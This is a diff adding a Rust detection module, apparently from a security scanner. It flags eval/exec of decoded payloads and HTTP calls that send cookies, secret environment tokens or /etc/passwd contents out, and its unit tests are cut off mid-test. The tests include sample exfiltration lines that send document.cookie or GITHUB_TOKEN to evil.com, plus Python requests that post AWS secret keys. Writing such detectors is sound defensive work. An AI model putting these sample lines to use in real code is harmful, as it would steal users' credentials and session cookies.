@@ -1,0 +1,1229 @@
+use once_cell::sync::Lazy;
+use regex::Regex;
+
+use crate::script_analysis::detect_interpreter;
+use crate::verdict::{Evidence, Finding, RuleId, Severity};
+
+/// Code file extensions eligible for scanning.
+const CODE_EXTENSIONS: &[&str] = &[
+    "js", "mjs", "cjs", "ts", "mts", "jsx", "tsx", "py", "pyw", "sh", "bash", "zsh", "fish", "ps1",
+    "psm1", "rb", "php", "pl",
+];
+
+/// Returns true if the file is a code file that should be scanned.
+pub fn is_code_file(path: Option<&str>, content: &str) -> bool {
+    if let Some(p) = path {
+        let lower = p.to_lowercase();
+        if let Some(ext) = lower.rsplit('.').next() {
+            if CODE_EXTENSIONS.contains(&ext) {
+                return true;
+            }
+        }
+    }
+    // Extensionless files count as code only if a shebang names a known interpreter.
+    if content.starts_with("#!") {
+        let interp = detect_interpreter(content);
+        if !interp.is_empty() {
+            return true;
+        }
+    }
+    false
+}
+
+/// Run code file pattern scanning rules.
+pub fn check(input: &str, file_path: Option<&str>) -> Vec<Finding> {
+    let mut findings = Vec::new();
+
+    check_dynamic_code_execution(input, &mut findings);
+    check_obfuscated_payload(input, &mut findings);
+    check_suspicious_code_exfiltration(input, file_path, &mut findings);
+
+    findings
+}
+
+/// Pairs of regexes that fire when both match within `PROXIMITY_WINDOW` bytes —
+/// the shape of dynamic code evaluation on decoded/obfuscated payloads.
+static DYNAMIC_CODE_PAIRS: Lazy<Vec<(Regex, Regex, &'static str)>> = Lazy::new(|| {
+    vec![
+        // JS: eval( near atob(
+        (
+            Regex::new(r"eval\s*\(").unwrap(),
+            Regex::new(r"atob\s*\(").unwrap(),
+            "eval() near atob()",
+        ),
+        // JS: eval( near String.fromCharCode
+        (
+            Regex::new(r"eval\s*\(").unwrap(),
+            Regex::new(r"String\.fromCharCode").unwrap(),
+            "eval() near String.fromCharCode()",
+        ),
+        // JS: new Function( near encoded content
+        (
+            Regex::new(r"new\s+Function\s*\(").unwrap(),
+            Regex::new(r"(?:atob|String\.fromCharCode|Buffer\.from)\s*\(").unwrap(),
+            "new Function() near encoded content",
+        ),
+        // Python: exec( near b64decode/base64.b64decode
+        (
+            Regex::new(r"exec\s*\(").unwrap(),
+            Regex::new(r"b(?:ase)?64[._]?b?64decode|b64decode").unwrap(),
+            "exec() near b64decode()",
+        ),
+        // Python: exec(compile(
+        (
+            Regex::new(r"exec\s*\(\s*compile\s*\(").unwrap(),
+            Regex::new(r"compile\s*\(").unwrap(),
+            "exec(compile())",
+        ),
+        // Python: exec(__import__(
+        (
+            Regex::new(r"exec\s*\(\s*__import__\s*\(").unwrap(),
+            Regex::new(r"__import__\s*\(").unwrap(),
+            "exec(__import__())",
+        ),
+    ]
+});
+
+const PROXIMITY_WINDOW: usize = 500;
+
+fn check_dynamic_code_execution(input: &str, findings: &mut Vec<Finding>) {
+    for (pattern_a, pattern_b, description) in DYNAMIC_CODE_PAIRS.iter() {
+        for mat_a in pattern_a.find_iter(input) {
+            // Clamp to char boundaries: ±PROXIMITY_WINDOW can land inside a
+            // multi-byte char, and unclamped byte slicing would panic.
+            let start = safe_start(input, mat_a.start().saturating_sub(PROXIMITY_WINDOW));
+            let end = safe_end(input, mat_a.end() + PROXIMITY_WINDOW);
+            let window = &input[start..end];
+
+            if pattern_b.is_match(window) {
+                findings.push(Finding {
+                    rule_id: RuleId::DynamicCodeExecution,
+                    severity: Severity::Medium,
+                    title: "Dynamic code execution with obfuscation".to_string(),
+                    description: format!("Detected {description} in close proximity"),
+                    evidence: vec![Evidence::CommandPattern {
+                        pattern: description.to_string(),
+                        matched: truncate(
+                            &input[mat_a.start()..safe_end(input, mat_a.end() + 80)],
+                            120,
+                        ),
+                    }],
+                    human_view: None,
+                    agent_view: None,
+                    mitre_id: None,
+                    custom_rule_id: None,
+                });
+                return;
+            }
+        }
+    }
+}
+
+static OBFUSCATED_DECODE_CALL: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?:atob\s*\(\s*["']|b64decode\s*\(\s*b?["']|Buffer\.from\s*\(\s*["'])([A-Za-z0-9+/=]{40,})"#,
+    )
+    .unwrap()
+});
+
+static EXEC_EVAL_NEARBY: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"(?:eval|exec|Function)\s*\(").unwrap());
+
+fn check_obfuscated_payload(input: &str, findings: &mut Vec<Finding>) {
+    for cap in OBFUSCATED_DECODE_CALL.captures_iter(input) {
+        let full_match = cap.get(0).unwrap();
+        // Clamp to UTF-8 char boundaries — see safe_start/safe_end.
+        let start = safe_start(input, full_match.start().saturating_sub(PROXIMITY_WINDOW));
+        let end = safe_end(input, full_match.end() + PROXIMITY_WINDOW);
+        let window = &input[start..end];
+
+        if EXEC_EVAL_NEARBY.is_match(window) {
+            findings.push(Finding {
+                rule_id: RuleId::ObfuscatedPayload,
+                severity: Severity::Medium,
+                title: "Obfuscated payload with decode-execute".to_string(),
+                description:
+                    "Long base64 string decoded and executed — likely obfuscated malicious payload"
+                        .to_string(),
+                evidence: vec![Evidence::CommandPattern {
+                    pattern: "base64 decode + eval/exec".to_string(),
+                    matched: truncate(full_match.as_str(), 120),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+            return;
+        }
+    }
+}
+
+/// JS HTTP call patterns — must capture up to the opening `(`
+static JS_HTTP_CALL: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"(?:fetch\s*\(|axios\.\w+\s*\(|\.send\s*\()").unwrap());
+
+/// Python HTTP call patterns — must capture up to the opening `(`
+static PY_HTTP_CALL: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"(?:requests\.(?:post|get|put)\s*\(|urllib\.request\.\w+\s*\()").unwrap()
+});
+
+/// Sensitive JS references: document.cookie or process.env.SENSITIVE_KEY
+static JS_SENSITIVE: Lazy<Regex> = Lazy::new(|| {
+    let keys = crate::sensitive_assets::secret_env_regex_fragment();
+    regex::RegexBuilder::new(&format!(r"(?:document\.cookie|process\.env\.(?:{}))", keys))
+        .case_insensitive(true)
+        .build()
+        .unwrap()
+});
+
+/// Sensitive Python references: os.environ["SENSITIVE_KEY"] or open("/etc/passwd")
+static PY_SENSITIVE: Lazy<Regex> = Lazy::new(|| {
+    let keys = crate::sensitive_assets::secret_env_regex_fragment();
+    regex::RegexBuilder::new(&format!(
+        r#"(?:os\.environ\[["'](?:{})["']\]|open\s*\(\s*["']/etc/(?:passwd|shadow)["'][^)]*\))"#,
+        keys
+    ))
+    .case_insensitive(true)
+    .build()
+    .unwrap()
+});
+
+/// Property keywords that indicate data/send context (fire the finding).
+static SEND_PROPS: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r"(?i)(?:body|data|json|params|payload)\s*[:=]").unwrap());
+
+/// Any property-like keyword (`word:` or `word=`) — used to detect when a
+/// secret is inside an unknown property (like `meta:`) that is NOT a send context.
+static GENERIC_PROP: Lazy<Regex> = Lazy::new(|| Regex::new(r"\b\w+\s*[:=]").unwrap());
+
+/// Find the end of a call's argument list (`open_pos` points AFTER the opening
+/// `(`); returns the byte position after the matching `)`, or None if unbalanced.
+/// Handles nested brackets, string literals, block/line comments, and JS regex
+/// literals (`/` preceded by a non-value byte).
+fn find_call_end(input: &[u8], open_pos: usize) -> Option<usize> {
+    let mut depth: u32 = 1;
+    let mut i = open_pos;
+    let mut in_string: Option<u8> = None;
+
+    while i < input.len() && depth > 0 {
+        let b = input[i];
+        match in_string {
+            Some(q) => {
+                if b == b'\\' && i + 1 < input.len() {
+                    i += 2;
+                    continue;
+                }
+                if b == q {
+                    in_string = None;
+                }
+            }
+            None => {
+                // Block comment `/* ... */`.
+                if b == b'/' && i + 1 < input.len() && input[i + 1] == b'*' {
+                    i += 2;
+                    while i + 1 < input.len() {
+                        if input[i] == b'*' && input[i + 1] == b'/' {
+                            i += 2;
+                            break;
+                        }
+                        i += 1;
+                    }
+                    continue;
+                }
+                // Line comment: `//` (JS) or `#` (Python/shell).
+                if (b == b'/' && i + 1 < input.len() && input[i + 1] == b'/') || b == b'#' {
+                    while i < input.len() && input[i] != b'\n' {
+                        i += 1;
+                    }
+                    continue;
+                }
+                // JS regex literal `/.../`: `/` after a non-value token isn't division.
+                if b == b'/' {
+                    let prev = {
+                        let mut j = i;
+                        while j > 0 && matches!(input[j - 1], b' ' | b'\t' | b'\n' | b'\r') {
+                            j -= 1;
+                        }
+                        if j > 0 {
+                            input[j - 1]
+                        } else {
+                            0
+                        }
+                    };
+                    let is_division = prev.is_ascii_alphanumeric()
+                        || matches!(prev, b')' | b']' | b'_' | b'$' | b'+' | b'-');
+                    if !is_division {
+                        i += 1;
+                        while i < input.len() && input[i] != b'/' {
+                            if input[i] == b'\\' && i + 1 < input.len() {
+                                i += 1;
+                            }
+                            i += 1;
+                        }
+                        if i < input.len() {
+                            i += 1;
+                        }
+                        continue;
+                    }
+                }
+                match b {
+                    b'"' | b'\'' | b'`' => in_string = Some(b),
+                    b'(' | b'[' | b'{' => depth += 1,
+                    b')' | b']' | b'}' => depth -= 1,
+                    _ => {}
+                }
+            }
+        }
+        i += 1;
+    }
+    if depth == 0 {
+        Some(i)
+    } else {
+        None
+    }
+}
+
+fn check_suspicious_code_exfiltration(
+    input: &str,
+    file_path: Option<&str>,
+    findings: &mut Vec<Finding>,
+) {
+    let is_js = file_path
+        .map(|p| {
+            let lower = p.to_lowercase();
+            lower.ends_with(".js")
+                || lower.ends_with(".mjs")
+                || lower.ends_with(".cjs")
+                || lower.ends_with(".ts")
+                || lower.ends_with(".mts")
+                || lower.ends_with(".jsx")
+                || lower.ends_with(".tsx")
+        })
+        .unwrap_or(false);
+
+    let is_py = file_path
+        .map(|p| {
+            let lower = p.to_lowercase();
+            lower.ends_with(".py") || lower.ends_with(".pyw")
+        })
+        .unwrap_or(false);
+
+    // Extensionless files: the shebang decides which exfil checker applies.
+    let (is_js, is_py) = if !is_js && !is_py && file_path.is_some() {
+        let interp = detect_interpreter(input);
+        (
+            matches!(interp, "node" | "deno" | "bun"),
+            matches!(interp, "python" | "python3" | "python2"),
+        )
+    } else {
+        (is_js, is_py)
+    };
+
+    if is_js {
+        check_js_exfiltration(input, findings);
+    }
+    if is_py {
+        check_py_exfiltration(input, findings);
+    }
+}
+
+/// Walk bytes up to `pos` tracking strings, comments, and bracket depth.
+/// Returns `(depth, is_code)` at the target position.
+fn code_context_at(s: &[u8], pos: usize) -> (i32, bool) {
+    let mut depth: i32 = 0;
+    let mut in_string: Option<u8> = None;
+    let mut i = 0;
+
+    while i < s.len() {
+        if i == pos {
+            return (depth, in_string.is_none());
+        }
+        let b = s[i];
+        if let Some(q) = in_string {
+            if b == b'\\' && i + 1 < s.len() {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                in_string = None;
+            }
+            i += 1;
+            continue;
+        }
+        if b == b'/' && i + 1 < s.len() && s[i + 1] == b'*' {
+            i += 2;
+            while i + 1 < s.len() {
+                if i == pos || i + 1 == pos {
+                    return (depth, false);
+                }
+                if s[i] == b'*' && s[i + 1] == b'/' {
+                    i += 2;
+                    break;
+                }
+                i += 1;
+            }
+            continue;
+        }
+        if (b == b'/' && i + 1 < s.len() && s[i + 1] == b'/') || b == b'#' {
+            while i < s.len() && s[i] != b'\n' {
+                if i == pos {
+                    return (depth, false);
+                }
+                i += 1;
+            }
+            continue;
+        }
+        // JS regex literal — see find_call_end for the same heuristic.
+        if b == b'/' {
+            let prev = {
+                let mut j = i;
+                while j > 0 && matches!(s[j - 1], b' ' | b'\t' | b'\n' | b'\r') {
+                    j -= 1;
+                }
+                if j > 0 {
+                    s[j - 1]
+                } else {
+                    0
+                }
+            };
+            let is_division = prev.is_ascii_alphanumeric()
+                || matches!(prev, b')' | b']' | b'_' | b'$' | b'+' | b'-');
+            if !is_division {
+                i += 1;
+                while i < s.len() && s[i] != b'/' {
+                    if i == pos {
+                        return (depth, false);
+                    }
+                    if s[i] == b'\\' && i + 1 < s.len() {
+                        i += 1;
+                    }
+                    i += 1;
+                }
+                if i < s.len() {
+                    if i == pos {
+                        return (depth, false);
+                    }
+                    i += 1;
+                }
+                continue;
+            }
+        }
+        match b {
+            b'"' | b'\'' | b'`' => in_string = Some(b),
+            b'(' | b'[' | b'{' => depth += 1,
+            b')' | b']' | b'}' => depth -= 1,
+            _ => {}
+        }
+        i += 1;
+    }
+    (depth, in_string.is_none())
+}
+
+/// Whether to suppress the exfil finding for a secret at `pos_in_span`. Finds
+/// the nearest shallow (depth ≤ 1) in-code property keyword before it: a SEND
+/// keyword (body/data/json/params/payload) fires (false), anything else
+/// suppresses (true), and no keyword (direct-arg / URL-concat) fires (false).
+///
+/// repo-0322: the header/auth suppression is only valid for same-origin
+/// requests. When the call target is an ABSOLUTE URL (potentially attacker-
+/// controlled origin), a secret in `headers`/`Authorization` is exactly the
+/// exfiltration channel and must NOT be suppressed.
+/// repo-0322: whether the call target contains an absolute `http(s)://` URL —
+/// the destination could then be attacker-controlled, so header-channel
+/// suppression no longer applies.
+fn has_absolute_url(arg_span: &str) -> bool {
+    use once_cell::sync::Lazy;
+    use regex::Regex;
+    static ABS_URL: Lazy<Regex> = Lazy::new(|| Regex::new(r#"["']https?://[^"']+"#).unwrap());
+    ABS_URL.is_match(arg_span)
+}
+
+fn should_suppress_exfil(arg_span: &str, pos_in_span: usize, absolute_target: bool) -> bool {
+    let before = &arg_span[..pos_in_span];
+    let bytes = before.as_bytes();
+
+    // Nearest property-like keyword at shallow depth in actual code.
+    let nearest_prop = GENERIC_PROP
+        .find_iter(before)
+        .filter(|m| {
+            let (depth, is_code) = code_context_at(bytes, m.start());
+            depth <= 1 && is_code
+        })
+        .last();
+
+    match nearest_prop {
+        Some(m) => {
+            if SEND_PROPS.is_match(m.as_str()) {
+                return false;
+            }
+            if absolute_target {
+                return false;
+            }
+            // headers/auth/meta/token/unknown — too noisy to flag.
+            true
+        }
+        // No surrounding property → positional/URL arg.
+        None => false,
+    }
+}
+
+fn emit_exfil_finding(findings: &mut Vec<Finding>, call_snippet: &str, sens_str: &str) {
+    findings.push(Finding {
+        rule_id: RuleId::SuspiciousCodeExfiltration,
+        severity: Severity::Medium,
+        title: "Suspicious code exfiltration pattern".to_string(),
+        description: format!(
+            "HTTP call passes sensitive data '{}' as argument — potential data exfiltration",
+            sens_str
+        ),
+        evidence: vec![Evidence::CommandPattern {
+            pattern: "sensitive data inside HTTP call arguments".to_string(),
+            matched: truncate(call_snippet, 120),
+        }],
+        human_view: None,
+        agent_view: None,
+        mitre_id: None,
+        custom_rule_id: None,
+    });
+}
+
+fn check_js_exfiltration(input: &str, findings: &mut Vec<Finding>) {
+    let bytes = input.as_bytes();
+    for http_match in JS_HTTP_CALL.find_iter(input) {
+        let call_end = match find_call_end(bytes, http_match.end()) {
+            Some(end) => end,
+            None => continue,
+        };
+        // `call_end` walks raw bytes and can land mid-char; clamp before slicing.
+        let arg_end = safe_end(input, call_end.saturating_sub(1)).max(http_match.end());
+        let arg_span = &input[http_match.end()..arg_end];
+
+        for sens_match in JS_SENSITIVE.find_iter(arg_span) {
+            if should_suppress_exfil(arg_span, sens_match.start(), has_absolute_url(arg_span)) {
+                continue;
+            }
+            let snippet_end = safe_end(input, call_end.min(input.len()));
+            let snippet = &input[http_match.start()..snippet_end];
+            emit_exfil_finding(findings, snippet, sens_match.as_str());
+            return;
+        }
+    }
+}
+
+fn check_py_exfiltration(input: &str, findings: &mut Vec<Finding>) {
+    let bytes = input.as_bytes();
+    for http_match in PY_HTTP_CALL.find_iter(input) {
+        let call_end = match find_call_end(bytes, http_match.end()) {
+            Some(end) => end,
+            None => continue,
+        };
+        // See check_js_exfiltration for boundary-clamping rationale.
+        let arg_end = safe_end(input, call_end.saturating_sub(1)).max(http_match.end());
+        let arg_span = &input[http_match.end()..arg_end];
+
+        for sens_match in PY_SENSITIVE.find_iter(arg_span) {
+            if should_suppress_exfil(arg_span, sens_match.start(), has_absolute_url(arg_span)) {
+                continue;
+            }
+            let snippet_end = safe_end(input, call_end.min(input.len()));
+            let snippet = &input[http_match.start()..snippet_end];
+            emit_exfil_finding(findings, snippet, sens_match.as_str());
+            return;
+        }
+    }
+}
+
+/// Find the largest byte index ≤ `target` that falls on a UTF-8 char boundary.
+fn safe_end(s: &str, target: usize) -> usize {
+    let clamped = target.min(s.len());
+    let mut end = clamped;
+    while end > 0 && !s.is_char_boundary(end) {
+        end -= 1;
+    }
+    end
+}
+
+/// Smallest byte index ≥ `target` on a UTF-8 char boundary (start-side mirror
+/// of `safe_end`).
+fn safe_start(s: &str, target: usize) -> usize {
+    let mut start = target.min(s.len());
+    while start < s.len() && !s.is_char_boundary(start) {
+        start += 1;
+    }
+    start
+}
+
+fn truncate(s: &str, max: usize) -> String {
+    if s.chars().count() <= max {
+        s.to_string()
+    } else {
+        let t: String = s.chars().take(max).collect();
+        format!("{t}...")
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_is_code_file_by_extension() {
+        assert!(is_code_file(Some("test.js"), ""));
+        assert!(is_code_file(Some("test.py"), ""));
+        assert!(is_code_file(Some("test.ts"), ""));
+        assert!(is_code_file(Some("test.sh"), ""));
+        assert!(is_code_file(Some("test.ps1"), ""));
+        assert!(!is_code_file(Some("notes.txt"), ""));
+        assert!(!is_code_file(Some("config.json"), ""));
+    }
+
+    #[test]
+    fn test_is_code_file_shebang() {
+        assert!(is_code_file(
+            Some("script"),
+            "#!/usr/bin/env python3\nimport os"
+        ));
+        assert!(is_code_file(Some("run"), "#!/bin/bash\necho hi"));
+        assert!(!is_code_file(Some("data"), "just some text"));
+    }
+
+    #[test]
+    fn test_dynamic_code_eval_atob() {
+        let input = r#"var x = eval(atob("SGVsbG8gV29ybGQ="));"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "eval+atob should fire DynamicCodeExecution"
+        );
+    }
+
+    #[test]
+    fn test_dynamic_code_exec_b64decode() {
+        let input = r#"exec(b64decode("SGVsbG8gV29ybGQ="))"#;
+        let findings = check(input, Some("test.py"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "exec+b64decode should fire DynamicCodeExecution"
+        );
+    }
+
+    #[test]
+    fn test_bare_eval_no_fire() {
+        let input = "eval(someVar);";
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "bare eval should not fire"
+        );
+    }
+
+    #[test]
+    fn test_eval_atob_distant_no_fire() {
+        let padding = "x".repeat(600);
+        let input = format!("eval(something);\n{padding}\natob('SGVsbG8=');");
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::DynamicCodeExecution),
+            "distant eval+atob should not fire"
+        );
+    }
+
+    #[test]
+    fn test_obfuscated_payload() {
+        let b64 = "A".repeat(50);
+        let input = format!(r#"eval(atob("{b64}"))"#);
+        let findings = check(&input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::ObfuscatedPayload),
+            "long base64 in atob near eval should fire ObfuscatedPayload"
+        );
+    }
+
+    #[test]
+    fn test_exfil_fetch_cookie() {
+        let input = r#"fetch("https://evil.com/?d=" + document.cookie)"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "fetch + document.cookie should fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_fetch_env_token() {
+        let input = r#"fetch(url, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "fetch + process.env.GITHUB_TOKEN in body should fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_auth_header_no_fire() {
+        let input = r#"fetch("/api/login", {headers: {"Authorization": "Bearer " + process.env.GITHUB_TOKEN}})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "Authorization header pattern should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_python_requests() {
+        let input = r#"requests.post(url, data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
+        let findings = check(input, Some("test.py"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "requests.post + secret env should fire"
+        );
+    }
+
+    #[test]
+    fn test_normal_fetch_no_fire() {
+        let input = r#"fetch("/api/data").then(r => r.json())"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "normal fetch should not fire"
+        );
+    }
+
+    #[test]
+    fn test_not_code_file_no_fire() {
+        let input = r#"eval(atob("SGVsbG8gV29ybGQ="));"#;
+        assert!(!is_code_file(Some("notes.txt"), input));
+    }
+
+    #[test]
+    fn test_internal_post_body_no_fire() {
+        let input = r#"requests.post("https://internal-api.example.com/log", json={"event": "login", "user": username})"#;
+        let findings = check(input, Some("test.py"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "internal API POST without sensitive data should not fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_js_meta_property_no_fire() {
+        let input = r#"fetch(url, {meta: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in non-send property 'meta:' should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_python_meta_kwarg_no_fire() {
+        let input = r#"requests.post(url, meta=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
+        let findings = check(input, Some("test.py"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in non-send kwarg 'meta=' should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_js_token_property_no_fire() {
+        let input = r#"fetch(url, {token: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in non-send property 'token:' should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_query_concat_fires() {
+        let input = r#"fetch("https://evil.com/c?token=" + process.env.GITHUB_TOKEN)"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "URL query concat with secret should fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_separate_statement_no_fire() {
+        // Regression: secret lives in a separate statement, not in the fetch call's args.
+        let input = r#"fetch(url); const payload = { token: process.env.GITHUB_TOKEN };"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in separate statement (not in call args) should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_unrelated_body_object_no_fire() {
+        // body: keyword exists nearby but belongs to unrelated local object
+        let input = r#"fetch(url); const opts = { body: bodyVar }; const token = process.env.GITHUB_TOKEN;"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "unrelated body object near fetch should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_document_cookie_not_sent_no_fire() {
+        // document.cookie is read but not passed as argument to the fetch call
+        let input = r#"fetch(url); console.log(document.cookie);"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "document.cookie outside call args should NOT fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_document_cookie_inside_call_fires() {
+        // document.cookie IS passed inside the fetch call's args
+        let input = r#"fetch("https://evil.com/?c=" + document.cookie)"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "document.cookie inside call args should fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_block_comment_in_args() {
+        // `)` inside a block comment must not terminate the arg span
+        let input =
+            r#"fetch(url /* ) */, {body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "block comment with ) inside call args should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_exfil_python_line_comment_in_args() {
+        // `#` line comment with `)` must not terminate the arg span
+        let input = "requests.post(url, # )\n    data=os.environ[\"AWS_SECRET_ACCESS_KEY\"])";
+        let findings = check(input, Some("test.py"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "Python # comment with ) inside call args should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_exfil_js_regex_literal_in_args() {
+        // regex literal /\(/ must not throw off delimiter counting
+        let input = r#"fetch(url, {body: /\(/, json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "JS regex literal with ( should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_find_call_end_block_comment() {
+        let input = b"url /* ) */, data)";
+        assert_eq!(find_call_end(input, 0), Some(18));
+    }
+
+    #[test]
+    fn test_find_call_end_line_comment() {
+        let input = b"url, # )\n    data)";
+        assert_eq!(find_call_end(input, 0), Some(18));
+    }
+
+    #[test]
+    fn test_find_call_end_regex_literal() {
+        let input = br#"url, {body: /\(/, val})"#;
+        assert_eq!(find_call_end(input, 0), Some(23));
+    }
+
+    #[test]
+    fn test_exfil_headers_then_body_fires() {
+        let input = r#"fetch(url, {headers: {Authorization: auth}, body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in body after headers in same call should fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_python_headers_then_data_fires() {
+        let input =
+            r#"requests.post(url, headers=headers, data=os.environ["AWS_SECRET_ACCESS_KEY"])"#;
+        let findings = check(input, Some("test.py"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "secret in data= after headers= in same call should fire"
+        );
+    }
+
+    #[test]
+    fn test_exfil_division_in_args_fires() {
+        let input = r#"fetch(url, {body: 1 / 2, json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "division operator in call args should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_exfil_paren_division_in_args_fires() {
+        let input = r#"fetch(url, {body: (a / b), json: process.env.GITHUB_TOKEN})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "parenthesized division in call args should not break parser"
+        );
+    }
+
+    #[test]
+    fn test_find_call_end_division() {
+        let input = b"url, {body: 1 / 2, val})";
+        assert_eq!(find_call_end(input, 0), Some(24));
+    }
+
+    #[test]
+    fn test_exfil_nested_headers_in_body_fires() {
+        let input = r#"fetch(url, {body: JSON.stringify({headers: "x", token: process.env.GITHUB_TOKEN})})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "nested 'headers' key inside body payload should NOT suppress"
+        );
+    }
+
+    #[test]
+    fn test_exfil_python_nested_headers_in_data_fires() {
+        let input = r#"requests.post(url, data={"headers": "x", "token": os.environ["AWS_SECRET_ACCESS_KEY"]})"#;
+        let findings = check(input, Some("test.py"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "nested 'headers' key inside data= dict should NOT suppress"
+        );
+    }
+
+    #[test]
+    fn test_exfil_nested_headers_in_json_fires() {
+        let input = r#"fetch(url, {json: {headers: "x", token: process.env.GITHUB_TOKEN}})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "nested 'headers' key inside json property should NOT suppress"
+        );
+    }
+
+    #[test]
+    fn test_exfil_python_hash_comment_headers_fires() {
+        let input = "requests.post(url, data={# headers: fake\n'token': os.environ[\"AWS_SECRET_ACCESS_KEY\"]})";
+        let findings = check(input, Some("test.py"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
+            "# headers: inside comment must NOT suppress data= exfil"
+        );
+    }
+
+    #[test]
+    fn test_exfil_js_block_comment_headers_fires() {
+        let input =
+            r#"fetch(url, {/* headers: */ body: JSON.stringify({key: process.env.GITHUB_TOKEN})})"#;
+        let findings = check(input, Some("test.js"));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.rule_id == RuleId::SuspiciousCodeExfiltration),
